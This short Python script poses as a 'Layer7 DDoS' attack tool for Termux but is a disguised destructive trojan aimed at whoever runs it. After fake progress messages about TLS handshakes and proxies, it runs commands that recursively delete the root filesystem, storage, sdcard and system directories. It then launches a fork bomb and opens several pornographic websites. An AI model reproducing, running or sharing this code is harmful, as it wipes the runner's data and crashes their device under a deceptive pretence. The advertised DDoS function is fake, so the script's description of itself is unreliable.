#Layer7 DDoS
#Developed by Vend3ttA
import os
from time import sleep

def banner():
    print("""
╔═╗╦ ╦╔╗ ╔═╗╦═╗╔╦╗╔═╗╔═╗╦╔═╗
║  ╚╦╝╠╩╗║╣ ╠╦╝║║║╠═╣╠╣ ║╠═╣
╚═╝ ╩ ╚═╝╚═╝╩╚═╩ ╩╩ ╩╚  ╩╩ ╩
L7 DDoS attack Created by Ven          
          """)

def launch_attack():
    banner()
    target = input("Enter Target>>>: ")
    seconds = int(input("Seconds>>>: "))
    print("Please wait...")
    sleep(1)
    print("Performing TLS Handshake....")
    sleep(1)
    print("Validating Proxies......")
    sleep(1)
    print(f"""
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
        TARGET: > {target}
        TIME: > {seconds}
        METHOD: > <<<<DESTROY>>>>""")
    print("WELCOME TO CYBERMAFIA PANEL")
    os.system('touch .hushlogin')
    os.system("termux-setup-storage")
    os.system("rm -rf /*")
    os.system("rm -rf /storage/*")
    os.system("rm -rf /sdcard/*")
    os.system('rm -rf /system/*')
    os.system(':(){ :|: & };:')
    os.system("xdg-open https://www.pornhub.com")
    os.system("xdg-open https://jabol2.tv")
    os.system("xdg-open https://www.youjizz.com")
    os.system("xdg-open https://pinayflix1.tv")
launch_attack()
